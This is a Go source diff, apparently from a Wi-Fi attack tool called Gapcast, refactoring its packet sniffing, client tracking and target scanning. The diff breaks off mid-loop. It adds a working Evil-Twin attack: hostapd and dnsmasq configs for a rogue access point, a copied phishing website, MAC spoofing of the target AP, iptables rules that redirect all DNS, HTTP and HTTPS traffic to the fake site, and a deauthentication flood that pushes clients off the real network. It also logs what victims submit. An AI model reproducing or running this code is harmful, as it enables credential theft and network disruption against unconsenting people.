-							if _, exist2 := inactiveClient[MAC]; exist2 {
-								analysisData.ClientData[MAC] = libs.DeviceClient{Bssid: inactiveClient[MAC].Bssid, Essid: inactiveClient[MAC].Essid, Manufacturer: inactiveClient[MAC].Manufacturer, Data: inactiveClient[MAC].Data + 1, Power: int(PWR), LastUpdate: time.Now()}
-								delete(inactiveClient, MAC)
-							} else if _, exist3 := analysisData.ClientData[MAC]; exist3 {
-								analysisData.ClientData[MAC] = libs.DeviceClient{Bssid: analysisData.ClientData[MAC].Bssid, Essid: analysisData.ClientData[MAC].Essid, Data: analysisData.ClientData[MAC].Data + 1, Manufacturer: analysisData.ClientData[MAC].Manufacturer, Power: int(PWR), LastUpdate: time.Now()}
-							} else {
-								analysisData.ClientData[MAC] = libs.DeviceClient{Bssid: BSSID_CLIENT, Essid: analysisData.DeviceData[BSSID_CLIENT].Essid, Data: 1, Power: int(PWR), Manufacturer: libs.GetManufacturer(macdb, MAC), LastUpdate: time.Now()}
-							}
-						}
-						writeToPcap(packet)
-						mutex.Unlock()
-					} else {
-						if packet.Layer(layers.LayerTypeLLC) == nil {
-							mutex.Lock()
-							writeToPcap(packet)
-							mutex.Unlock()
-						}
+						break
 					}
 				}
 			}
-		} (pkt)
-	}
-}
-
-func handlehandle(nameiface string, iface string, chans []int, prefix string, dinac bool, onlyBeacon bool) {
-	handle = libs.GetMonitorSniffer(nameiface, iface, color)
-	go handlePacket(handle, chans, prefix, true, onlyBeacon, false)
-	if !dinac {
-		go moveActiveToInactive()
-	}
-	for {
-		time.Sleep(time.Millisecond * 100)
-		if paused {
-			for {
-				time.Sleep(time.Millisecond * 100)
-				if !paused {
-					if !dinac {
-						resetPreActive()
-					}
-					handle = libs.GetMonitorSniffer(nameiface, iface, color)
-					go handlePacket(handle, chans, prefix, true, onlyBeacon, false)
-					if !dinac {
-						go moveActiveToInactive()
-					}
-					break
-				}
-			}
 		}
-	}
-}
-
-func engine(nameiface string, iface string, ChannelList []int, prefix string, dinac bool, onlyBeacon bool) {
-	ChannelChanger(ChannelList, nameiface)
-	go handlehandle(nameiface, iface, ChannelList, prefix, dinac, onlyBeacon)
-	go regE(nameiface)
-	go regT(nameiface, ChannelList)
+	}()
+	go func() { // old regE func
+		var regKey *hotkey.Hotkey = hotkey.New([]hotkey.Modifier{hotkey.ModCtrl}, hotkey.KeyE)
+		regKey.Register()
+		defer regKey.Unregister()
+		for {
+			<-regKey.Keydown()
+			<-regKey.Keyup()
+			mutex.Lock()
+			if paused {
+				libs.SetMonitorMode(nameiface)
+				paused = false
+			} else {
+				libs.SetManagedMode(nameiface)
+				paused = true
+			}
+			mutex.Unlock()
+		}
+	}()
+	go func(channelList []int) { // old regT func
+		var regKey *hotkey.Hotkey = hotkey.New([]hotkey.Modifier{hotkey.ModCtrl}, hotkey.KeyT)
+		regKey.Register()
+		defer regKey.Unregister()
+		for {
+			<-regKey.Keydown()
+			<-regKey.Keyup()
+			mutex.Lock()
+			keyboard.Close()
+			if !openTable {
+				tableinj = libs.INJTable{}
+				srcTable, dstTable, esdTable, tableScene, errTable, openTable = "", "", "", 0, 0, true
+				go regXINJ(nameiface, channelList)
+			} else {
+				openTable, injection = false, false
+			}
+			mutex.Unlock()
+		}
+	}(channelList)
 	update()
 }
 
@@ -1251,30 +1297,32 @@ func printChart(offline bool) {
 	}
 	sort.Strings(deviceDataSort)
 	for _, bssid := range deviceDataSort {
-		if rssiradar {
-			chartBSSID.AddRow(bssid, analysisData.DeviceData[bssid].Enc + " ", analysisData.DeviceData[bssid].Power, analysisData.DeviceData[bssid].Beacons, analysisData.DeviceData[bssid].Data, analysisData.DeviceData[bssid].Ch, analysisData.DeviceData[bssid].Essid, analysisData.DeviceData[bssid].Manufacturer, libs.RadioLocalize(analysisData.DeviceData[bssid].Power, analysisData.DeviceData[bssid].Ch, radarconf))
+		if rssiRadar {
+			chartBSSID.AddRow(bssid, fmt.Sprintf("%s ", analysisData.DeviceData[bssid].Enc), analysisData.DeviceData[bssid].Power, analysisData.DeviceData[bssid].Beacons, analysisData.DeviceData[bssid].Data, analysisData.DeviceData[bssid].Ch, analysisData.DeviceData[bssid].Essid, analysisData.DeviceData[bssid].Manufacturer, libs.RadioLocalize(analysisData.DeviceData[bssid].Power, analysisData.DeviceData[bssid].Ch, radarconf))
 		} else {
-			chartBSSID.AddRow(bssid, analysisData.DeviceData[bssid].Enc + " ", analysisData.DeviceData[bssid].Power, analysisData.DeviceData[bssid].Beacons, analysisData.DeviceData[bssid].Data, analysisData.DeviceData[bssid].Ch, analysisData.DeviceData[bssid].Essid, analysisData.DeviceData[bssid].Manufacturer)
+			chartBSSID.AddRow(bssid, fmt.Sprintf("%s ", analysisData.DeviceData[bssid].Enc), analysisData.DeviceData[bssid].Power, analysisData.DeviceData[bssid].Beacons, analysisData.DeviceData[bssid].Data, analysisData.DeviceData[bssid].Ch, analysisData.DeviceData[bssid].Essid, analysisData.DeviceData[bssid].Manufacturer)
 		}
 	}
-	for mac := range analysisData.ClientData {
-		clientDataSort = append(clientDataSort, mac)
-	}
-	sort.Strings(clientDataSort)
-	for _, mac := range clientDataSort {
-		if rssiradar {
-			chartCLIENT.AddRow(mac, analysisData.ClientData[mac].Bssid, analysisData.ClientData[mac].Power, analysisData.ClientData[mac].Data, analysisData.ClientData[mac].Essid, analysisData.ClientData[mac].Manufacturer, libs.RadioLocalize(analysisData.ClientData[mac].Power, analysisData.DeviceData[strings.ToLower(analysisData.ClientData[mac].Bssid)].Ch, radarconf))
-		} else {
-			chartCLIENT.AddRow(mac, analysisData.ClientData[mac].Bssid, analysisData.ClientData[mac].Power, analysisData.ClientData[mac].Data, analysisData.ClientData[mac].Essid, analysisData.ClientData[mac].Manufacturer)
+	if !onlyBeacon {
+		for mac := range analysisData.ClientData {
+			clientDataSort = append(clientDataSort, mac)
+		}
+		sort.Strings(clientDataSort)
+		for _, mac := range clientDataSort {
+			if rssiRadar {
+				chartCLIENT.AddRow(mac, analysisData.ClientData[mac].Bssid, analysisData.ClientData[mac].Power, analysisData.ClientData[mac].Data, analysisData.ClientData[mac].Essid, analysisData.ClientData[mac].Manufacturer, libs.RadioLocalize(analysisData.ClientData[mac].Power, analysisData.DeviceData[strings.ToLower(analysisData.ClientData[mac].Bssid)].Ch, radarconf))
+			} else {
+				chartCLIENT.AddRow(mac, analysisData.ClientData[mac].Bssid, analysisData.ClientData[mac].Power, analysisData.ClientData[mac].Data, analysisData.ClientData[mac].Essid, analysisData.ClientData[mac].Manufacturer)
+			}
 		}
 	}
 	mutex.Unlock()
 	libs.ScreenClear()
-	fmt.Print(libs.GetRow1(color, capturedEapol, globalChannel, elapsedTime, offline))
+	fmt.Print("\n" + libs.GetRow1(color, capturedEapol, globalChannel, elapsedTime, offline))
 	chartBSSID.Print()
 	fmt.Println()
-	if len(analysisData.ClientData) != 0 {
-		chartCLIENT.Print() 
+	if !onlyBeacon || len(analysisData.ClientData) != 0 {
+		chartCLIENT.Print()
 		if !offline {
 			fmt.Println()
 		}
@@ -1288,33 +1336,20 @@ func printChart(offline bool) {
 	chartCLIENT.SetRows(nil)
 	if paused {
 		var elapsedTimePause time.Time = time.Now()
-		for paused {time.Sleep(100 * time.Millisecond)}
-		elapsedTime = elapsedTime.Add(time.Until(elapsedTimePause))
+		for paused {
+			time.Sleep(100 * time.Millisecond)
+		}
+		elapsedTime = elapsedTime.Add(time.Since(elapsedTimePause))
 	}
-}
-
-func setupChart() {
-	if rssiradar {
-		chartBSSID = table.New("BSSID", "ENC", "PWR", "BEACONS", "DATA", "CH", "ESSID", "MANUFACTURER", "RAY")
-	} else {
-		chartBSSID = table.New("BSSID", "ENC", "PWR", "BEACONS", "DATA", "CH", "ESSID", "MANUFACTURER")
+	if panicExit {
+		return
 	}
-	chartBSSID.WithHeaderFormatter(colo.New(colo.BgHiBlue, colo.FgHiWhite).SprintfFunc())
-	if rssiradar {
-		chartCLIENT = table.New("STATION", "BSSID", "PWR", "DATA", "ESSID", "MANUFACTURER", "RAY")
-	} else {
-		chartCLIENT = table.New("STATION", "BSSID", "PWR", "DATA", "ESSID", "MANUFACTURER")
-	}
-	chartCLIENT.WithHeaderFormatter(colo.New(colo.BgHiCyan, colo.FgHiWhite).SprintfFunc())
-	analysisData.DeviceData = make(map[string]libs.Device)
-	analysisData.ClientData = make(map[string]libs.DeviceClient)
 }
 
 func loaderSetupView(file string) {
-	libs.ScreenClear()
 	color = libs.SetupColors()
 	libs.PrintLogo(color, "Initializing...")
-	go libs.Loading("[" + color.Green + "INIT" + color.White + "] Loading pcap file", mt)
+	go libs.Loading(fmt.Sprintf("%s[%sINIT%s] Loading pcap file", color.White, color.Green, color.White), mt)
 	time.Sleep(1200 * time.Millisecond)
 	handle, err := pcap.OpenOffline(file)
 	elapsedTime = time.Now().Add(-handle.Resolution().ToDuration())
@@ -1326,12 +1361,12 @@ func loaderSetupView(file string) {
 	defer handle.Close()
 	var warning bool
 	macdb, warning = jsonreader.ReadMacdb()
-	setupChart()
 	if warning {
-		fmt.Println("[" + color.Yellow + "WARNING" + color.White + "] Failure to read the manufacturer db.")
+		libs.Error(color, "Failure to read the manufacturer db.")
 		time.Sleep(1200 * time.Millisecond)
 	}
-	handlePacket(handle, libs.G5g24Channels[:], "?", false, false, true)
+	setupChart()
+	handlePacket(handle, libs.G5g24Channels[:], "?", false, true)
 	if len(analysisData.DeviceData) <= 0 {
 		mt <- true
 		fmt.Println()
@@ -1342,160 +1377,416 @@ func loaderSetupView(file string) {
 	time.Sleep(1 * time.Second)
 }
 
-func deepScanning(ChannelList []int, nameiface string, iface string, bssid string) {
+func deepScanning(channelList []int, bssid string) {
 	var stage int = 1
 	var deviceDBM int
 	var info libs.InfoSingleDevice
 	var isClient bool
 	var srcmac string
 	var dbmreg []int
-	var stagemsg []string = []string{"Detecting target", 
-									 "Analysis target", 
-									 "Finalization of target's data"}
+	var stagemsg []string = []string{"Detecting target",
+		"Analysis target",
+		"Finalization of target's data"}
 	sngtrgLoading = true
 	var customRadarconf jsonreader.RadarConf = radarconf
 	time.Sleep(1 * time.Second)
 	for stage < 4 {
 		if stage == 1 {
-			libs.ScreenClear()
 			libs.PrintLogo(color, "Running scan mode...")
-			fmt.Println(color.White + "[" + color.Blue + "MSG" + color.White + "] Gapcast's target scanner")
+			libs.Log(color, "Gapcast's target scanner started.")
 			fmt.Println()
 			time.Sleep(2 * time.Second)
 		}
 		if stage != 4 {
-			go libs.Loading(color.White + "[" + color.Green + "SCAN" + color.White + "] Stage " + strconv.Itoa(stage) + " <" + color.Purple + stagemsg[stage - 1] + color.White + ">", chanstage)
+			go libs.Loading(fmt.Sprintf("%s[%sSCAN%s] Stage %d <%s%s%s>", color.White, color.Green, color.White, stage, color.Purple, stagemsg[stage-1], color.White), chanstage)
 		}
 		time.Sleep(1 * time.Second)
 		switch stage {
-			case 1:
-				ChannelChanger(ChannelList, nameiface)
-				handle = libs.GetMonitorSniffer(nameiface, iface, color)
-				go handlePacket(handle, ChannelList, "?", false, false, false)
-				for {
-					time.Sleep(time.Second * 5)
-					mutex.Lock()
-					if info1, exist1 := analysisData.DeviceData[strings.ToUpper(bssid)]; exist1 {
-						isClient = false
-						info = libs.InfoSingleDevice{Essid: info1.Essid, Manufacturer: info1.Manufacturer, Channel: info1.Ch}
-						srcmac = strings.ToUpper(bssid)
-						mutex.Unlock()
-						break
-					} else if info2, exist2 := analysisData.ClientData[strings.ToUpper(bssid)]; exist2 {
-						isClient = true
-						info = libs.InfoSingleDevice{Essid: info2.Essid, Manufacturer: info2.Manufacturer, Channel: analysisData.DeviceData[info2.Bssid].Ch}
-						srcmac = strings.ToUpper(info2.Bssid) // srcmac on this line is AP bssid
-						mutex.Unlock()
-						break
-					}
+		case 1:
+			channelChanger(channelList)
+			handle = libs.GetMonitorSniffer(nameiface, color)
+			go handlePacket(handle, channelList, "?", false, false)
+			for {
+				time.Sleep(time.Second * 5)
+				mutex.Lock()
+				if info1, exist1 := analysisData.DeviceData[strings.ToUpper(bssid)]; exist1 {
+					isClient = false
+					info = libs.InfoSingleDevice{Essid: info1.Essid, Manufacturer: info1.Manufacturer, Channel: info1.Ch}
+					srcmac = strings.ToUpper(bssid)
 					mutex.Unlock()
+					break
+				} else if info2, exist2 := analysisData.ClientData[strings.ToUpper(bssid)]; exist2 {
+					isClient = true
+					info = libs.InfoSingleDevice{Essid: info2.Essid, Manufacturer: info2.Manufacturer, Channel: analysisData.DeviceData[info2.Bssid].Ch}
+					srcmac = strings.ToUpper(info2.Bssid) // srcmac on this line is AP bssid
+					mutex.Unlock()
+					break
 				}
-				stopScan = true
-				chanstage <- true
-			case 2:
-				var handle *pcap.Handle = libs.GetMonitorSniffer(nameiface, iface, color)
-				var packets *gopacket.PacketSource = gopacket.NewPacketSource(handle, handle.LinkType())
-				defer handle.Close()
-				singleChannel = true
-				ChannelChanger([]int{info.Channel}, nameiface)
-				var scantime time.Time = time.Now()
-				for packet := range packets.Packets() {
-					if packet.ErrorLayer() == nil && packet != nil && packet.Layer(layers.LayerTypeDot11) != nil {
-						if PWR, err := libs.GetDBM(packet); !err {
-							if TRS, RCV, err := libs.GetAPSTDATA(packet); err == nil {
-								if strings.EqualFold(RCV, srcmac) {									
-									info.ReceivedPKT++					
-								} else if strings.EqualFold(TRS, srcmac) {
-									dbmreg = append(dbmreg, int(PWR))
-									info.SendedPKT++
-								}
-								if dot11 := packet.Layer(layers.LayerTypeDot11).(*layers.Dot11); 
-								dot11.Type.MainType() == layers.Dot11TypeCtrl {
-									info.SndRcvACK++
-								}
+				mutex.Unlock()
+			}
+			panicExit = true
+			chanstage <- true
+		case 2:
+			var handle *pcap.Handle = libs.GetMonitorSniffer(nameiface, color)
+			var packets *gopacket.PacketSource = gopacket.NewPacketSource(handle, handle.LinkType())
+			defer handle.Close()
+			singleChannel = true
+			channelChanger([]int{info.Channel})
+			var scantime time.Time = time.Now()
+			for packet := range packets.Packets() {
+				if packet.ErrorLayer() == nil && packet != nil && packet.Layer(layers.LayerTypeDot11) != nil {
+					if PWR, err := libs.GetDBM(packet); !err {
+						if TRS, RCV, err := libs.GetAPSTAData(packet); !err {
+							if strings.EqualFold(RCV, srcmac) {
+								info.ReceivedPKT++
+							} else if strings.EqualFold(TRS, srcmac) {
+								dbmreg = append(dbmreg, int(PWR))
+								info.SendedPKT++
+							}
+							if dot11 := packet.Layer(layers.LayerTypeDot11).(*layers.Dot11); dot11.Type.MainType() == layers.Dot11TypeCtrl {
+								info.SndRcvACK++
 							}
 						}
 					}
-					if int64(time.Since(scantime).Seconds()) > 10 {
-						if info.SendedPKT > 0 {
-							break
-						} else {
-							scantime = time.Now()
-							continue
-						}
+				}
+				if int64(time.Since(scantime).Seconds()) > 10 {
+					if info.SendedPKT > 0 {
+						break
+					} else {
+						scantime = time.Now()
+						continue
 					}
 				}
-				chanstage <- true
-			case 3:
-				sort.Ints(dbmreg)
-				var drlen = int(math.Round(float64(len(dbmreg) / 2)))
-				if len(dbmreg) % 2 == 0 {
-					deviceDBM = (dbmreg[drlen - 1] + dbmreg[drlen]) / 2
-				} else {
-					deviceDBM = dbmreg[drlen]
+			}
+			chanstage <- true
+		case 3:
+			sort.Ints(dbmreg)
+			var drlen = int(math.Round(float64(len(dbmreg) / 2)))
+			if len(dbmreg)%2 == 0 {
+				deviceDBM = (dbmreg[drlen-1] + dbmreg[drlen]) / 2
+			} else {
+				deviceDBM = dbmreg[drlen]
+			}
+			radarconf, _ = jsonreader.ReadRadarConf()
+			for _, dbmlevel := range []float64{2, 3, 5} {
+				radarconf.TXAntennaDBI = dbmlevel
+				switch dbmlevel {
+				case 2:
+					info.PowerLOW = libs.RadioLocalize(deviceDBM, info.Channel, radarconf)
+				case 3:
+					info.PowerMID = libs.RadioLocalize(deviceDBM, info.Channel, radarconf)
+				case 5:
+					info.PowerHIGH = libs.RadioLocalize(deviceDBM, info.Channel, radarconf)
 				}
-				radarconf, _ = jsonreader.ReadRadarConf()
-				for _, dbmlevel := range []float64{2, 3, 5} {
-					radarconf.TXAntennaDBI = dbmlevel
-					switch dbmlevel {
-						case 2:
-							info.PowerLOW = libs.RadioLocalize(deviceDBM, info.Channel, radarconf)
-						case 3:
-							info.PowerMID = libs.RadioLocalize(deviceDBM, info.Channel, radarconf)
-						case 5:
-							info.PowerHIGH = libs.RadioLocalize(deviceDBM, info.Channel, radarconf)
-					}
-				}
-				chanstage <- true
+			}
+			chanstage <- true
 		}
 		time.Sleep(1 * time.Second)
 		stage++
 	}
 	sngtrgLoading = false
-	fmt.Println("\n" + color.White + "Analysis's response")
-	fmt.Println(color.White + ">  =========================\n")
-	fmt.Println(color.White + "     | [" + color.Blue + "ESSID" + color.White + "]       " + info.Essid)
-	var spcsForNames []int = []int{6, 4, 5, 1, 1, 8, 1, 3, 3, 3}
+	fmt.Printf("\n%sAnalysis's response\n", color.White)
+	fmt.Printf("%s>  %s\n\n", color.White, strings.Repeat("=", 25))
+	fmt.Printf("%s     | [%sESSID%s]       %s\n", color.White, color.Blue, color.White, info.Essid)
 	var infonames []string = []string{"BSSID", "CHANNEL", "VENDOR", "SENDED-PKT", "RECEVD-PKT", "ACK", "RECEVD-DBM", "ANT-2DBI", "ANT-3DBI", "ANT-5DBI"}
-	for idxname, infoelem := range []interface{}{srcmac, 
-		                                         info.Channel,
-												 info.Manufacturer, 
-												 info.SendedPKT,
-												 info.ReceivedPKT, 
-												 info.SndRcvACK,
-												 strconv.Itoa(deviceDBM) + " dBm", 
-												 info.PowerLOW, 
-												 info.PowerMID, 
-												 info.PowerHIGH} {
-		fmt.Printf("%s %v\n", color.White + "     | [" + color.Blue + infonames[idxname] + color.White + "]" + strings.Repeat(" ", spcsForNames[idxname]), infoelem)
+	for idxname, infoelem := range []interface{}{srcmac,
+		info.Channel,
+		info.Manufacturer,
+		info.SendedPKT,
+		info.ReceivedPKT,
+		info.SndRcvACK,
+		fmt.Sprintf("%d dBm", deviceDBM),
+		info.PowerLOW,
+		info.PowerMID,
+		info.PowerHIGH} {
+		fmt.Printf("%s     | [%s%s%s]%s %v\n", color.White, color.Blue, infonames[idxname], color.White, strings.Repeat(" ", 11-len(infonames[idxname])), infoelem)
 	}
 	var deviceType string
 	switch isClient {
-		case true:
-			deviceType = "STATION"
-		case false:
-			deviceType = "ACCESS-POINT"
+	case true:
+		deviceType = "STATION"
+	case false:
+		deviceType = "ACCESS-POINT"
 	}
 	if tdaPresent || rdaPresent || pddPresent {
-		fmt.Println(color.White + "     | [" + color.Blue + "CUSTM-CONF" + color.White + "]  " + libs.RadioLocalize(deviceDBM, info.Channel, customRadarconf))
+		fmt.Printf("%s     | [%sCUSTM-CONF%s]  %s\n", color.White, color.Blue, color.White, libs.RadioLocalize(deviceDBM, info.Channel, customRadarconf))
 	}
-	fmt.Println(color.White + "     | [" + color.Blue + "DEVICE-TYPE" + color.White + "] " + deviceType)
-	fmt.Println("\n" + color.White + "   =========================")
+	fmt.Printf("%s     | [%sDEVICE-TYPE%s] %s\n", color.White, color.Blue, color.White, deviceType)
+	fmt.Printf("\n%s   %s\n\n", color.White, strings.Repeat("=", 25))
 }
 
+func runEvilTwin(nameiface string) {
+	var nodeauthStarting bool = false
+	var handle2 *pcap.Handle
+	apnameiface = nameiface
+	tableinj.ESSID = " " + tableinj.ESSID
+	for {
+		time.Sleep(350 * time.Millisecond)
+		libs.PrintLogo(color, "Setup Evil-Twin attack...")
+		time.Sleep(1 * time.Second)
+		var writer *tabwriter.Writer = tabwriter.NewWriter(os.Stdout, 0, 0, 5, ' ', 0)
+		var ifacesFound bool = false
+		fmt.Fprintf(writer, "%s\tIndex\tInterface\tDriver\tChipset\n", color.White)
+		var avifaces []libs.Ifaces
+		for _, iface := range libs.ShowIfaces() {
+			if apnameiface == iface.Name {
+				continue
+			}
+			if ifaceinfo, err := libs.GetIfaceInfo(iface.Name); !err {
+				avifaces = append(avifaces, libs.Ifaces{Name: iface.Name})
+				ifacesFound = true
+				fmt.Fprintf(writer, "%s\t%s\t%s\t%s\t%s", color.White, strconv.Itoa(len(avifaces)-1), iface.Name, ifaceinfo[3], ifaceinfo[4])
+
+			}
+		}
+		if ifacesFound {
+			writer.Flush()
+			var ifaceindexScan string
+			time.Sleep(1500 * time.Millisecond)
+			fmt.Printf("\n\n%s[%sINPUT%s] Select available network interface for De-Auth [0-%s] (default: no-adapter mode): ", color.White, color.Green, color.White, strconv.Itoa(len(avifaces)-1)+"] (default: no-adapter mode): ")
+			fmt.Scanln(&ifaceindexScan)
+			fmt.Println()
+			if ifaceindexScan == "" {
+				libs.NOTIMECustomLog(color, color.Blue, "LOG", "Starting without De-Auth injection...")
+				nodeauthStarting = true
+				time.Sleep(3 * time.Second)
+				break
+			}
+			if ifaceindex, err := strconv.Atoi(ifaceindexScan); err == nil {
+				if ifaceindex < 0 || ifaceindex > len(avifaces)-1 {
+					libs.Error(color, "Selection error, updating...\n")
+					time.Sleep(2 * time.Second)
+				} else {
+					nameiface = avifaces[ifaceindex].Name
+					if !libs.MonSupportCheck(nameiface) {
+						libs.Error(color, fmt.Sprintf("%s don't support monitor mode, updating...\n", apnameiface))
+						time.Sleep(2 * time.Second)
+					} else if tableinj.CHANNEL > 14 && !libs.G5Check(nameiface) {
+						libs.Error(color, fmt.Sprintf("%s don't support 5 Ghz (iface's channel: %d), updating...\n", apnameiface, tableinj.CHANNEL))
+						time.Sleep(2 * time.Second)
+					} else {
+						fmt.Printf("%s[%sLOG%s] %s: Setting up monitor mode ...", color.White, color.Blue, color.White, nameiface)
+						if err := libs.SetMonitorMode(nameiface); err {
+							fmt.Printf("%sFAIL\n\n%s", color.Red, color.White)
+							libs.Error(color, "Bad interface.")
+							time.Sleep(2 * time.Second)
+						} else {
+							time.Sleep(1200 * time.Millisecond)
+							fmt.Println("Done")
+							handle2 = libs.GetMonitorSniffer(nameiface, color)
+							break
+						}
+					}
+				}
+			} else {
+				libs.Error(color, "Selection error (is number?), updating...\n")
+				time.Sleep(2 * time.Second)
+			}
+		} else {
+			libs.PrintLogo(color, "Setup Evil-Twin attack...")
+			libs.Warning(color, "No valid interface found: Starting without De-Auth injection...\n")
+			nodeauthStarting = true
+			apnameiface = nameiface
+			time.Sleep(3 * time.Second)
+			break
+		}
+	}
+	var trycounter int = 0
+	var errorRetry bool = false
+	for trycounter < 3 {
+		trycounter++
+		libs.PrintLogo(color, "Setup Evil-Twin attack...")
+		var dnsmasqconf string = "interface=br0\nlisten-address=10.1.1.1\nno-hosts\ndhcp-range=10.1.1.2,10.1.1.254,10m\ndhcp-option=option:router,10.1.1.1\ndhcp-authoritative\naddress=/#/10.1.1.1"
+		os.WriteFile("/etc/dnsmasq.conf", []byte(dnsmasqconf), 0644)
+		libs.Log(color, "Creating dnsmasq config file ... Done")
+		var apconf string = fmt.Sprintf("interface=%s\nssid=%s\nhw_mode=g\nieee80211n=1\nchannel=%d\nwmm_enabled=1\nauth_algs=1\nbridge=br0", apnameiface, tableinj.ESSID, tableinj.CHANNEL)
+		path, _ := os.Getwd()
+		os.WriteFile(path+"/config/apconf", []byte(apconf), 0644)
+		libs.Log(color, "Creating hostapd config file ... Done")
+		os.WriteFile(path+"/etc/apache2/conf-available/override.conf", []byte("<Directory /var/www/>\n    Options Indexes FollowSymLinks MultiViews\n    AllowOverride All\n    Order Allow,Deny\n    Allow from all\n</Directory>"), 0644)
+		libs.Log(color, "Creating Apache2 config file ... Done")
+		if libs.IsRunning("hostapd") || libs.IsRunning("dnsmasq") {
+			libs.Rtexec(exec.Command("bash", "-c", "killall hostapd dnsmasq"))
+			libs.Log(color, "Killing hostapd and dnsmasq process ... Done")
+		}
+		var changedMac string
+		if tableinj.SRC[0][len(tableinj.SRC[0])-1] == 1 {
+			changedMac = tableinj.SRC[0][:len(tableinj.SRC[0])-1] + "2"
+		} else {
+			changedMac = tableinj.SRC[0][:len(tableinj.SRC[0])-1] + "1"
+		}
+		var ETSetupCommands []string = []string{"cd /etc/apache2/conf-enabled && ln -f -s ../conf-available/override.conf override.conf && cd /etc/apache2/mods-enabled && ln -f -s ../mods-available/rewrite.load rewrite.load && rm /var/log/apache2/access.log && touch /var/log/apache2/access.log",
+			"cp -Rf EvilTwin/html /var/www/ && chown -R www-data:www-data /var/www/html && chown root:www-data /var/www/html/.htaccess",
+			fmt.Sprintf("ifconfig %s down", apnameiface),
+			fmt.Sprintf("macchanger -m %s %s", libs.Fmac(changedMac), apnameiface),
+			fmt.Sprintf("ifconfig %s up", apnameiface),
+			fmt.Sprintf("rm %s/log/hostapd.log", path),
+			fmt.Sprintf("hostapd %s/config/apconf | tee %s/log/hostapd.log", path, path),
+			"ifconfig br0 up",
+			"ifconfig br0 10.1.1.1 netmask 255.255.255.0",
+			"sysctl net.ipv4.ip_forward=1",
+			"iptables --flush",
+			"iptables -t nat --flush",
+			"iptables -t nat -A PREROUTING -i br0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53",
+			"iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80",
+			"iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.1.1.1:80",
+			"iptables -t nat -A POSTROUTING -j MASQUERADE",
+			"service dnsmasq start & service dnsmasq restart",
+			"service apache2 start & service apache2 restart"}
+		var ETSetupStatus []string = []string{"Setup Apache2 config",
+			"Setup web-site",
+			"",
+			fmt.Sprintf("Changing MAC address [%s]", libs.Fmac(changedMac)),
+			"",
+			"Resetting hostapd config",
+			"Running hostapd",
+			"",
+			"Setup AP network interface",
+			"Enabling IPv4 forwarding",
+			"Resetting iptables config",
+			"Resetting iptables NAT config",
+			"Set iptables config (1/4)",
+			"Set iptables config (2/4)",
+			"Set iptables config (3/4)",
+			"Set iptables config (4/4)",
+			"Starting dnsmasq",
+			"Starting Apache2 server"}
+		var ETSetupWait []int = []int{600, 600, 1000, 1500, 1000, 400, 4000, 2000, 2000, 300, 200, 200, 100, 100, 100, 100, 2000, 500}
+		panicExit, eviltwinAcc = false, true
+		for seqindex := 0; seqindex < 18; seqindex++ {
+			if panicExit {
+				eviltwinQuit = true
+				return
+			}
+			if ETSetupStatus[seqindex] != "" {
+				fmt.Printf("%s[%s%s%s] [%sLOG%s] %s ... ", color.White, color.Yellow, time.Now().Format("15:04:05"), color.White, color.Blue, color.White, ETSetupStatus[seqindex])
+			}
+			var err bool
+			var msgerr string
+			if seqindex != 6 {
+				msgerr, err = libs.Rtexec(exec.Command("bash", "-c", ETSetupCommands[seqindex]))
+			} else {
+				go libs.Rtexec(exec.Command("bash", "-c", ETSetupCommands[seqindex]))
+				err = false
+			}
+			time.Sleep(time.Duration(ETSetupWait[seqindex]) * time.Millisecond)
+			if ETSetupStatus[seqindex] != "" {
+				if err && strings.Contains(msgerr, "SAME MAC") {
+					fmt.Printf("%sFAIL\n\n%s", color.Red, color.White)
+					libs.Log(color, "Retrying...")
+					time.Sleep(2 * time.Second)
+					errorRetry = true
+					break
+				} else {
+					fmt.Print("Done\n")
+					time.Sleep(150 * time.Millisecond)
+				}
+			}
+		}
+		if errorRetry {
+			errorRetry = false
+			continue
+		}
+		fmt.Println()
+		libs.CustomLog(color, color.Blue, "AP-INFO", fmt.Sprintf("ESSID: '%s', BSSID: %s, CH: %d\n", tableinj.ESSID, libs.Fmac(changedMac), tableinj.CHANNEL))
+		os.Remove(infograbfile)
+		var logFiles []string = []string{path + "/log/hostapd.log", infograbfile, apache2logFile}
+		var logFilesTitle []string = []string{"HOSTAPD-LOG", "WEBSITE-LOG", "WEBSITE-LOG"}
+		var loglines []int = []int{0, 0, 0}
+		var ClientsIPDetected []string = []string{}
+		ETLogRead, eviltwinMode = true, true
+		if !nodeauthStarting {
+			go func() {
+				time.Sleep(1 * time.Second)
+				libs.ChangeChannel(nameiface, tableinj.CHANNEL)
+				libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Started injection to [%s%s%s] with %sDe-Auth%s (%sReason 7%s)", colo.New(colo.BgGreen).Sprint("INFO"), color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
+				for !panicExit {
+					for seq := 0; seq < 64; seq++ {
+						if panicExit {
+							break
+						}
+						if success := injpacket.InjectPacket(handle2, nameiface, tableinj.CHANNEL, tableinj.CHANNEL, injpacket.Deauth(tableinj.SRC[0], "", seq)); !success {
+							libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Injection error to [%s%s%s] with %sDe-Auth%s (%sReason 7%s) | (Can't inject packet?)", colo.New(colo.BgGreen).Sprint("INFO"), color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
+							time.Sleep(1200 * time.Millisecond)
+							break
+						}
+						time.Sleep(2 * time.Millisecond)
+					}
+					time.Sleep(180 * time.Millisecond)
+				}
+				libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Quitted injection to [%s%s%s] with %sDe-Auth%s (%sReason 7%s)", colo.New(colo.BgGreen).Sprint("INFO"), color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
+			}()
+		}
+		for {
+			for logfileindex, logfile := range logFiles {
+				if textlograw, err := os.ReadFile(logfile); err == nil {
+					var textlogl []string = strings.Split(string(textlograw), "\n")
+					if len(textlogl)-1 < loglines[logfileindex] {
+						continue
+					}
+					if textlog := textlogl[loglines[logfileindex]]; textlog != "" && textlog != "\r\n" {
+						if logFilesTitle[logfileindex] == "WEBSITE-LOG" {
